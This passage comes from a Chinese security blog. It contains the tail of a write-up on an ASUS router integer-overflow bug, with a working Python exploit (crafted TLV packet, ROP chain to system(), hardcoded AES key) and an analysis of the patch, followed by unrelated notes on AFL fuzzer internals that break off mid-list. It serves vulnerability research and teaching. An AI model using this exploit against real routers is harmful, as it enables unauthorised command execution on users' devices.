class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p32 = <span class="keyword">lambda</span> x: struct.pack(<span class="string">&quot;&lt;I&quot;</span>, x)</span><br><span class="line">p32b = <span class="keyword">lambda</span> x: struct.pack(<span class="string">&quot;&gt;I&quot;</span>, x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_encode</span>(<span class="params">data, key</span>):</span><br><span class="line">    aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> aes.encrypt(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_tlv_request</span>(<span class="params">_tlv_type, _tlv_len, _tlv_crc, _tlv_data=<span class="string">b&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">return</span> p32b(_tlv_type) + p32b(_tlv_len) + p32b(_tlv_crc) + _tlv_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&quot;192.168.50.1&quot;</span>, <span class="number">7788</span>))</span><br><span class="line">tlv_type = <span class="number">0x5</span></span><br><span class="line">tlv_len = <span class="number">0xffffffff</span></span><br><span class="line">tlv_crc = <span class="number">0</span></span><br><span class="line">request = make_tlv_request(tlv_type, tlv_len, tlv_crc)</span><br><span class="line">s.send(request)</span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">.text:000528CC 06 00 A0 E1                   MOV             R0, R6</span></span><br><span class="line"><span class="string">.text:000528D0 04 30 95 E5                   LDR             R3, [R5,#4]</span></span><br><span class="line"><span class="string">.text:000528D4 38 20 9D E5                   LDR             R2, [SP,#0x38+arg_0]</span></span><br><span class="line"><span class="string">.text:000528D8 31 1F BF E6                   REV             R1, R1</span></span><br><span class="line"><span class="string">.text:000528DC 33 FF 2F E1                   BLX             R3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">gadget_add = <span class="number">0x000528CC</span></span><br><span class="line">system_plt = <span class="number">0x00014754</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0xb6500760: fake cipher</span></span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0x000001aa</span>) + p32(<span class="number">0x00000010</span>) + p32(<span class="number">0x00000020</span>) + p32(<span class="number">0x00000000</span>)</span><br><span class="line">payload+= p32(<span class="number">0x00100000</span>) + p32(<span class="number">0xb6e2f480</span>) + p32(gadget_add) + p32(<span class="number">0x00000000</span>)</span><br><span class="line">payload+= p32(<span class="number">0x00000100</span>) + p32(<span class="number">0x00000000</span>) + p32(<span class="number">0x00000000</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x210</span>, <span class="string">b&quot;a&quot;</span>)</span><br><span class="line">payload+= <span class="string">b&quot;echo 66\x00&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x218</span>, <span class="string">b&quot;a&quot;</span>)</span><br><span class="line">payload+= p32(<span class="number">0xb6500760</span>)</span><br><span class="line">payload+= p32(system_plt)</span><br><span class="line">payload = payload.ljust(<span class="number">0x280</span>, <span class="string">b&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">tlv_type = <span class="number">0x28</span></span><br><span class="line">tlv_len = <span class="number">0xffffffff</span></span><br><span class="line">tlv_crc = <span class="number">0</span></span><br><span class="line">tlv_data = aes_encode(payload, <span class="string">b&quot;12345678000000000000000000000000&quot;</span>)</span><br><span class="line">request = make_tlv_request(tlv_type, tlv_len, tlv_crc, tlv_data)</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&quot;192.168.50.1&quot;</span>, <span class="number">7788</span>))</span><br><span class="line">s.sendall(request)</span><br><span class="line">s.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v15 &lt;= recv_len )</span><br><span class="line">    &#123;</span><br><span class="line">      tlv_type = *tlv_buf;</span><br><span class="line">      tlv_len = tlv_buf[<span class="number">1</span>];</span><br><span class="line">      tlv_crc = tlv_buf[<span class="number">2</span>];</span><br><span class="line">      <span class="keyword">if</span> ( recv_len - <span class="number">12</span> != bswap32(tlv_len) )</span><br><span class="line">      &#123;</span><br><span class="line">      ...</span><br><span class="line">          <span class="keyword">return</span> ;</span><br><span class="line">      </span><br></pre></td></tr></table></figure>

<p>在<strong>cm_packetProcess</strong>函数中，加入了对<strong>tlv_len</strong>的检查，即检查接收数据长度的减去12是否与tlv_len相等，不等则直接返回。这样就可以避免<strong>tlv_len</strong>被控制为一个很大的值，从而避免整数溢出。</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="noopener" href="https://wzt.ac.cn/2021/11/02/TFC2021-AX56U/">https://wzt.ac.cn/2021/11/02/TFC2021-AX56U/</a></p>
<p><a target="_blank" rel="noopener" href="https://cq674350529.github.io/2023/08/05/Analyzing-the-Vulnerability-in-ASUS-Router-maybe-from-TFC2021/">https://cq674350529.github.io/2023/08/05/Analyzing-the-Vulnerability-in-ASUS-Router-maybe-from-TFC2021/</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fxc233.github.io/2023/12/15/AFL%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E5%B0%8F%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="fxc233">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fxc233's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/12/15/AFL%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E5%B0%8F%E8%AE%B0/" class="post-title-link" itemprop="url">AFL源码阅读小记</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-12-15 12:26:27 / Modified: 12:44:05" itemprop="dateCreated datePublished" datetime="2023-12-15T12:26:27+08:00">2023-12-15</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="afl-gcc"><a href="#afl-gcc" class="headerlink" title="afl-gcc"></a>afl-gcc</h1><h2 id="find-as"><a href="#find-as" class="headerlink" title="find-as"></a>find-as</h2><p>用来寻找<strong>as</strong>的路径。分别从环境变量<strong>AFL_PATH</strong>，<strong>afl-gcc的路径（如果是绝对路径或相对路径调用afl-gcc）</strong>，&#x2F;usr&#x2F;local&#x2F;lib&#x2F;afl三个地方寻找。如果找不到则报出相应错误。下列是我调试时打印出来的参数。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">afl-gcc: find_as</span><br><span class="line">argv0: afl-gcc</span><br><span class="line">AFL_PATH: /usr/local/lib/afl</span><br></pre></td></tr></table></figure>

<h2 id="edit-params"><a href="#edit-params" class="headerlink" title="edit_params"></a>edit_params</h2><p>用来对原生<strong>gcc</strong>进行一个封装，加上了一些参数并存放到<strong>cc_params</strong>中。如笔者使用<strong>afl-gcc -o test test.c</strong>对文件进行编译，则会被封装成如下代码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gcc</span><br><span class="line">-o</span><br><span class="line">test</span><br><span class="line">test.c</span><br><span class="line">-B</span><br><span class="line">/usr/local/lib/afl</span><br><span class="line">-g</span><br><span class="line">-O3</span><br><span class="line">-funroll-loops</span><br><span class="line">-D__AFL_COMPILER=1</span><br><span class="line">-DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1</span><br></pre></td></tr></table></figure>

<h1 id="afl-as"><a href="#afl-as" class="headerlink" title="afl-as"></a>afl-as</h1><h2 id="edit-params-1"><a href="#edit-params-1" class="headerlink" title="edit_params"></a>edit_params</h2><p>对原生<strong>as</strong>进行封装，参数存放到<strong>as_params</strong>中。同时通过传入的参数设置一些变量的值，并且定义好<strong>modified_file</strong>。原本传入的命令和经过修改的命令如下。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">argv                          as_params</span><br><span class="line">/usr/local/lib/afl/as         as</span><br><span class="line">--64                          --64</span><br><span class="line">-o                            -o</span><br><span class="line">/tmp/cc6ribB2.o               /tmp/cc6ribB2.o</span><br><span class="line">/tmp/ccBeRi60.s               /tmp/.afl-165297-1701960501.s</span><br></pre></td></tr></table></figure>

<p>最终主函数中也会运行这个命令。</p>
<h2 id="add-instrumentation"><a href="#add-instrumentation" class="headerlink" title="add_instrumentation"></a>add_instrumentation</h2><p>尝试把<strong>input_file</strong>中的内容，进行插桩并放到<strong>modified_file</strong>中。打开文件后满足以下规则进行插桩。</p>
<ul>
<li>!pass_thru，不是用来传送数据</li>
<li>!skip_intel，不是intel汇编</li>
<li>!skip_app，不是__asm__内联汇编</li>
<li>!skip_csect，不与当前架构不适配（比如在x64架构中遇到x86汇编）</li>
<li>instr_ok，在text段中</li>
<li>instrument_next，有时会把instrument_next置零使得不会进行插桩</li>
<li>line[0] &#x3D;&#x3D; ‘\t’，此行开头要为<strong>\t</strong></li>
<li>isalpha(line[1])，line[1]要是字母</li>
</ul>
<p>或者遇到跳转指令且不是<strong>jmp</strong>时，也会插桩。</p>
<p>最后如果存在满足上述条件的地方，并进行了插桩，在最后则会根据架构插入<strong>main_payload_64或main_payload_32</strong>。</p>
<p>总的来说就是遇到如下汇编时进行插桩。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function:   ——  函数入口</span><br><span class="line">.L0         ——  GCC分支跳转标签</span><br><span class="line">.jnz fun    ——  条件跳转</span><br></pre></td></tr></table></figure>

<h2 id="trampoline"><a href="#trampoline" class="headerlink" title="trampoline"></a>trampoline</h2><p>比如x64程序中插入的代码如下，会调用__afl_maybe_log，且<strong>rcx</strong>的值是一个不超过<strong>1&lt;&lt;16</strong>的随机数。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&quot;leaq -(128+24)(%%rsp), %%rsp\n&quot;</span><br><span class="line">&quot;movq %%rdx,  0(%%rsp)\n&quot;</span><br><span class="line">&quot;movq %%rcx,  8(%%rsp)\n&quot;</span><br><span class="line">&quot;movq %%rax, 16(%%rsp)\n&quot;</span><br><span class="line">&quot;movq $0x%08x, %%rcx\n&quot;</span><br><span class="line">&quot;call __afl_maybe_log\n&quot;</span><br><span class="line">&quot;movq 16(%%rsp), %%rax\n&quot;</span><br><span class="line">&quot;movq  8(%%rsp), %%rcx\n&quot;</span><br><span class="line">&quot;movq  0(%%rsp), %%rdx\n&quot;</span><br><span class="line">&quot;leaq (128+24)(%%rsp), %%rsp\n&quot;</span><br></pre></td></tr></table></figure>

<h3 id="afl-maybe-log"><a href="#afl-maybe-log" class="headerlink" title="__afl_maybe_log"></a>__afl_maybe_log</h3><p>检查共享内存(__afl_area_ptr)是否已经被设置，如果没被设置就调用__afl_setup进行初始化，设置过就调用__afl_store。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;  movq  __afl_area_ptr(%rip), %rdx\n&quot;</span><br><span class="line">&quot;  testq %rdx, %rdx\n&quot;</span><br><span class="line">&quot;  je    __afl_setup\n&quot;</span><br><span class="line">&quot;\n&quot;</span><br><span class="line">&quot;__afl_store:\n&quot;</span><br></pre></td></tr></table></figure>

<h3 id="afl-setup"><a href="#afl-setup" class="headerlink" title="__afl_setup"></a>__afl_setup</h3><p>会检查__afl_setup_failure是否为0，也即检查之前__afl_setup是否调用失败，如果之前失败则跳转到__afl_return返回。否则再检查__afl_global_area_ptr是否为0，为0则跳转到__afl_setup_first进行初始化，否则把__afl_global_area_ptr赋值给__afl_area_ptr后，跳转到__afl_store。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&quot;  cmpb $0, __afl_setup_failure(%rip)\n&quot;</span><br><span class="line">&quot;  jne __afl_return\n&quot;</span><br><span class="line">&quot;  movq  __afl_global_area_ptr(%rip), %rdx\n&quot;</span><br><span class="line">&quot;  testq %rdx, %rdx\n&quot;</span><br><span class="line">&quot;  je    __afl_setup_first\n&quot;</span><br><span class="line">&quot;  movq %rdx, __afl_area_ptr(%rip)\n&quot;</span><br><span class="line">&quot;  jmp  __afl_store\n&quot; </span><br></pre></td></tr></table></figure>

<h3 id="afl-setup-first"><a href="#afl-setup-first" class="headerlink" title="__afl_setup_first"></a>__afl_setup_first</h3><p>用来保存寄存器并保证栈对齐。之后调用<strong>shmat</strong>获取共享内存地址存放到全局变量__afl_area_ptr及__afl_global_area_ptr中。执行完毕调用__afl_forkserver。</p>
<h3 id="afl-forkserver"><a href="#afl-forkserver" class="headerlink" title="__afl_forkserver"></a>__afl_forkserver</h3><p>向管道中写入<strong>4字节</strong>，来通知<strong>fuzz</strong>我们<strong>fork-server</strong>已经准备好。写入失败则会调用__afl_fork_resume。成功则调用__afl_fork_wait_loop。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&quot;  pushq %rdx\n&quot;</span><br><span class="line">&quot;  pushq %rdx\n&quot;</span><br><span class="line">&quot;  movq $4, %rdx               /* length    */\n&quot;</span><br><span class="line">&quot;  leaq __afl_temp(%rip), %rsi /* data      */\n&quot;</span><br><span class="line">&quot;  movq $&quot; STRINGIFY((FORKSRV_FD + 1)) &quot;, %rdi       /* file desc */\n&quot;</span><br><span class="line">CALL_L64(&quot;write&quot;)</span><br><span class="line">&quot;  cmpq $4, %rax\n&quot;</span><br><span class="line">&quot;  jne  __afl_fork_resume\n&quot;</span><br><span class="line">&quot;\n&quot;</span><br><span class="line">&quot;__afl_fork_wait_loop:\n&quot;</span><br></pre></td></tr></table></figure>

<h3 id="afl-fork-wait-loop"><a href="#afl-fork-wait-loop" class="headerlink" title="__afl_fork_wait_loop"></a>__afl_fork_wait_loop</h3><p>等待父进程从管道发送来的命令，并存放到__afl_temp中。读取失败则调用__afl_die，成功则调用<strong>fork</strong>。子进程中调用__afl_fork_resume，当前进程把子进程号记录到__afl_fork_pid后，再写入管道，并且等待子进程返回。等待子进程执行完毕，把子进程状态写入管道告知<strong>fuzz</strong>。再重新调用__afl_fork_wait_loop进行下一轮测试。</p>
<h3 id="afl-fork-resume"><a href="#afl-fork-resume" class="headerlink" title="__afl_fork_resume"></a>__afl_fork_resume</h3><p>关闭管道描述符，恢复寄存器的值。调用__afl_store。</p>
<h3 id="afl-die"><a href="#afl-die" class="headerlink" title="__afl_die"></a>__afl_die</h3><p>调用<strong>_exit</strong>。</p>
<h3 id="afl-store"><a href="#afl-store" class="headerlink" title="__afl_store"></a>__afl_store</h3><p>用来计算边的命中次数，<strong>RCX</strong>即当前边的id。首先计算rcx和更新__afl_prev_loc 。</p>
<ul>
<li>rcx &#x3D; rcx ^ __afl_prev_loc</li>
<li>__afl_prev_loc &#x3D; __afl_prev_loc ^ rcx</li>
<li>__afl_prev_loc &#x3D; __afl_prev_loc &gt;&gt; 1</li>
</ul>
<p>之后把__afl_area_ptr[rcx]+1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#ifndef COVERAGE_ONLY</span><br><span class="line">  &quot;  xorq __afl_prev_loc(%rip), %rcx\n&quot;</span><br><span class="line">  &quot;  xorq %rcx, __afl_prev_loc(%rip)\n&quot;</span><br><span class="line">  &quot;  shrq $1, __afl_prev_loc(%rip)\n&quot;</span><br><span class="line">#endif /* ^!COVERAGE_ONLY */</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">#ifdef SKIP_COUNTS</span><br><span class="line">  &quot;  orb  $1, (%rdx, %rcx, 1)\n&quot;</span><br><span class="line">#else</span><br><span class="line">  &quot;  incb (%rdx, %rcx, 1)\n&quot;</span><br><span class="line">#endif /* ^SKIP_COUNTS */</span><br></pre></td></tr></table></figure>

<h1 id="afl-fuzz"><a href="#afl-fuzz" class="headerlink" title="afl-fuzz"></a>afl-fuzz</h1><h2 id="setup-signal-handlers"><a href="#setup-signal-handlers" class="headerlink" title="setup_signal_handlers"></a>setup_signal_handlers</h2><p>注册必要的信号处理函数</p>
<h2 id="check-asan-opts"><a href="#check-asan-opts" class="headerlink" title="check_asan_opts"></a>check_asan_opts</h2><p>读取环境变量<strong>ASAN_OPTIONS</strong>和<strong>MSAN_OPTIONS</strong>并进行检查。</p>
<h2 id="fix-up-sync"><a href="#fix-up-sync" class="headerlink" title="fix_up_sync"></a>fix_up_sync</h2><p>如果存在-M或-S，更改out_dir和sync_id。</p>
<h2 id="save-cmdline"><a href="#save-cmdline" class="headerlink" title="save_cmdline"></a>save_cmdline</h2><p>保存命令行参数到全局变量<strong>orig_cmdline</strong>中。</p>
<h2 id="fix-up-banner"><a href="#fix-up-banner" class="headerlink" title="fix_up_banner"></a>fix_up_banner</h2><p>获取测试文件名</p>
<h2 id="check-if-tty"><a href="#check-if-tty" class="headerlink" title="check_if_tty"></a>check_if_tty</h2><p>检查是否在<strong>tty</strong>中运行，并记录在<strong>not_on_tty</strong>里。</p>
<h2 id="get-core-count"><a href="#get-core-count" class="headerlink" title="get_core_count"></a>get_core_count</h2><p>获取cpu的核心数</p>
<h2 id="bind-to-free-cpu"><a href="#bind-to-free-cpu" class="headerlink" title="bind_to_free_cpu"></a>bind_to_free_cpu</h2><p>linux系统，如果存在空闲核心，就绑定到这个cpu上</p>
<h2 id="check-crash-handling"><a href="#check-crash-handling" class="headerlink" title="check_crash_handling"></a>check_crash_handling</h2><p>检查crash的处理方式，执行<strong>echo core &gt;&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;core_pattern</strong>，以防存在延迟。</p>
<h2 id="setup-post"><a href="#setup-post" class="headerlink" title="setup_post"></a>setup_post</h2><p>如果存在环境变量<strong>AFL_POST_LIBRARY</strong>，则会从其记录的动态链接库中获取函数<strong>afl_postprocess</strong>，并记录到全局函数指针<strong>post_handler</strong>中。这个函数指针会被<strong>common_fuzz_stuff</strong>调用，用来处理<strong>out_buf</strong>。</p>
<h2 id="setup-shm"><a href="#setup-shm" class="headerlink" title="setup_shm"></a>setup_shm</h2><p>用来初始化共享内存，设置<strong>SHM_ENV_VAR</strong>，和初始化<strong>virgin_bits</strong>，<strong>virgin_tmout</strong>，<strong>virgin_crash</strong>。</p>
<ul>
<li>如果<strong>in_bitmap</strong>为空，就初始化<strong>virgin_bits</strong>，<strong>virgin_tmout</strong>，<strong>virgin_crash</strong>为<strong>\xff</strong>。</li>
<li>shmget(IPC_PRIVATE, MAP_SIZE, IPC_CREAT | IPC_EXCL | 0600); 分配共享内存，并把id存到<strong>shm_id</strong>里。</li>
<li>atexit(remove_shm); 注册处理函数在退出时删除共享内存。（这个atexit也就是ctf里所谓的“exit-hook”的一种。😀</li>
<li>setenv(SHM_ENV_VAR, shm_str, 1); 如果不是<strong>dumb_mode</strong>，设置<strong>SHM_ENV_VAR</strong>为<strong>shm_str</strong>。</li>
<li>trace_bits &#x3D; shmat(shm_id, NULL, 0); 启动对共享内存的访问。</li>
</ul>
<h2 id="init-count-class16"><a href="#init-count-class16" class="headerlink" title="init_count_class16"></a>init_count_class16</h2><p>初始化<strong>count_class_lookup16</strong>，目的是提高<strong>count_class_lookup8</strong>的效率。先看一下<strong>count_class_lookup8</strong>定义。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> u8 count_class_lookup8[<span class="number">256</span>] = &#123;</span><br><span class="line"></span><br><span class="line">  [<span class="number">0</span>]           = <span class="number">0</span>,</span><br><span class="line">  [<span class="number">1</span>]           = <span class="number">1</span>,</span><br><span class="line">  [<span class="number">2</span>]           = <span class="number">2</span>,</span><br><span class="line">  [<span class="number">3</span>]           = <span class="number">4</span>,</span><br><span class="line">  [<span class="number">4</span> ... <span class="number">7</span>]     = <span class="number">8</span>,</span><br><span class="line">  [<span class="number">8</span> ... <span class="number">15</span>]    = <span class="number">16</span>,</span><br><span class="line">  [<span class="number">16</span> ... <span class="number">31</span>]   = <span class="number">32</span>,</span><br><span class="line">  [<span class="number">32</span> ... <span class="number">127</span>]  = <span class="number">64</span>,</span><br><span class="line">  [<span class="number">128</span> ... <span class="number">255</span>] = <span class="number">128</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>count_class_lookup8</strong>用来对路径命中率做规整。比如有些时候<strong>A-&gt;B</strong>，出现了4次，有时候出现5次，这可能并不意味着出现新的路径。同时也为了减少因为命中次数不一样导致的区别。于是就定义了<strong>count_class_lookup8</strong>用来做一个规整。把<strong>4-7</strong>次都看作<strong>8</strong>次，以此类推。</p>
<p>而<strong>AFL</strong>中进行规整的时候一次性读入2字节，于是出现了count_class_lookup16。</p>
<h2 id="setup-dirs-fds"><a href="#setup-dirs-fds" class="headerlink" title="setup_dirs_fds"></a>setup_dirs_fds</h2><p>创建输出文件夹以及记录fd。</p>
<h2 id="read-testcases"><a href="#read-testcases" class="headerlink" title="read_testcases"></a>read_testcases</h2><p>从输入文件夹里读取所有文件，并将其加入测试队列中。</p>
<ul>
<li>nl_cnt &#x3D; scandir(in_dir, &amp;nl, NULL, alphasort); 记录文件数量和信息</li>
<li>通过循环遍历所有文件<ul>
<li>通过文件属性，大小和名称过滤掉无效文件</li>
<li>add_to_queue(fn, st.st_size, passed_det); 通过筛选，则加入测试队列</li>
</ul>
</li>
</ul>
<h2 id="add-to-queue"><a href="#add-to-queue" class="headerlink" title="add_to_queue"></a>add_to_queue</h2><p>增加测试样例到队列中。</p>
<ul>
<li>新建一个<strong>queue_entry</strong>结构体以记录<strong>test case</strong>。</li>
<li>更新<strong>max_depth</strong></li>
<li>如果<strong>queue_top</strong>存在，则<strong>queue_top-&gt;next &#x3D; q; queue_top &#x3D; q;<strong>，否则</strong>q_prev100 &#x3D; queue &#x3D; queue_top &#x3D; q;</strong></li>
<li><strong>queued_paths</strong>和<strong>pending_not_fuzzed</strong>加1</li>
<li>如果<strong>queued_paths % 100 &#x3D; 0</strong>，则<strong>q_prev100-&gt;next_100 &#x3D; q; q_prev100 &#x3D; q;</strong></li>
<li>设置<strong>last_path_time &#x3D; get_cur_time();</strong></li>
</ul>
<h2 id="load-auto"><a href="#load-auto" class="headerlink" title="load_auto"></a>load_auto</h2><p>加载自动生成的提取出来的词典token。从目标文件中读取内容，如果满足要求则调用<strong>maybe_add_auto(tmp, len);</strong></p>
<h2 id="maybe-add-auto"><a href="#maybe-add-auto" class="headerlink" title="maybe_add_auto"></a>maybe_add_auto</h2><ul>
<li>遍历<strong>mem</strong>里的字节，当出现有字节和第一个字节相同时停止遍历。</li>
<li>如果mem[0]&#x3D;&#x3D;mem[1]，则直接返回</li>
<li>如果<strong>mem</strong>的长度为<strong>2</strong>，则将<strong>mem和interesting_16</strong>进行比较，出现相同则直接返回</li>
<li>如果<strong>mem</strong>的长度为<strong>4</strong>，则将<strong>mem和interesting_32</strong>进行比较，出现相同则直接返回</li>
<li>将<strong>mem和extras中现有的数据</strong>进行比较，如果出现与<strong>mem</strong>相同的片段则直接退出。</li>
<li>设置auto_changed &#x3D; 1;</li>
<li>遍历<strong>a_extras</strong>，出现相同则a_extras[i].hit_cnt++；，否则把<strong>mem</strong>加入<strong>a_extras</strong></li>
</ul>
<h2 id="pivot-inputs"><a href="#pivot-inputs" class="headerlink" title="pivot_inputs"></a>pivot_inputs</h2><p>为<strong>in_dir</strong>里的testcase在<strong>out_dir&#x2F;queue</strong>里创建<strong>hard link</strong>。遍历输入目录的所有文件名，判断是否符合命名规范，如果不符合则按照规范重新命名，之后创建硬链接。</p>
<h2 id="load-extras"><a href="#load-extras" class="headerlink" title="load_extras"></a>load_extras</h2><p>如果指定了<strong>extras_dir</strong>，那么从<strong>extras_dir</strong>里读取数据到<strong>extras</strong>里，并按照大小排序。</p>
<h2 id="find-timeout"><a href="#find-timeout" class="headerlink" title="find_timeout"></a>find_timeout</h2><p>没有指定<strong>timeout_given</strong>时进入这个函数，设置<strong>timeout_given</strong>。</p>
<h2 id="detect-file-args"><a href="#detect-file-args" class="headerlink" title="detect_file_args"></a>detect_file_args</h2><p>识别命令行参数中是否含有**@@<strong>，如果存在则替换为</strong>out_dir&#x2F;.cur_input**。</p>
<h2 id="setup-stdio-file"><a href="#setup-stdio-file" class="headerlink" title="setup_stdio_file"></a>setup_stdio_file</h2><p>如果没有指定<strong>out_file</strong>，那么删除旧的并创建新的<strong>out_dir&#x2F;.cur_input</strong>，并获取其fd存放到<strong>out_fd</strong>中。</p>
<h2 id="check-binary"><a href="#check-binary" class="headerlink" title="check_binary"></a>check_binary</h2><p>检查目标文件是否存在以及确保他不是一个shell script。并检查是否是完整的elf文件以及是否被插桩。</p>
<h2 id="get-cur-time"><a href="#get-cur-time" class="headerlink" title="get_cur_time"></a>get_cur_time</h2><p>毫秒级获取时间</p>
<h2 id="perform-dry-run"><a href="#perform-dry-run" class="headerlink" title="perform_dry_run"></a>perform_dry_run</h2><p>执行测试用例，检查是否按照预期进行。</p>
<ul>
<li>获取环境变量<strong>AFL_SKIP_CRASHES</strong></li>
<li>遍历queue<ul>
<li>打开q-&gt;fname，并读取其内容。</li>
<li>调用<strong>res &#x3D; calibrate_case(argv, q, use_mem, 0, 1);</strong></li>
<li>如果stop_soon&#x3D;&#x3D;1，则直接返回。</li>
<li>如果<strong>res</strong>为crash_mode或者FAULT_NOBITS，则打印提示。</li>
<li>根据错误类型抛出不同异常。</li>
<li>如果<strong>q-&gt;var_behavior</strong>为真，说明该测试样例多次运行所覆盖的路径不同。</li>
</ul>
</li>
</ul>
<h2 id="calibrate-case"><a href="#calibrate-case" class="headerlink" title="calibrate_case"></a>calibrate_case</h2><p>测试输入样例是否会触发异常，以及检测新发现的路径样例的行为是否可变。</p>
<ul>
<li>如果<strong>q-&gt;exec_cksum</strong>为0，代表这个测试样例第一次运行，把first_run置为1。</li>
<li>保持原来的stage_cur、stage_max、stage_name。</li>
<li>如果测试样例不是来自queue，则use_tmout增大，且q-&gt;cal_failed++;。</li>
<li>设置stage_name &#x3D; “calibration”;，并且通过fast_cal来判断，stage_max是3还是CAL_CYCLES（默认8），即这个样例测试的次数。</li>
<li>不是dumb mode，并且<strong>forkserver</strong>没有启动，则调用**init_forkserver(argv);**。</li>
<li>如果不是第一次运行这个测试样例，则把<strong>trace_bits</strong>拷贝进<strong>first_trace</strong>。</li>
<li>开始calibrate stage<ul>
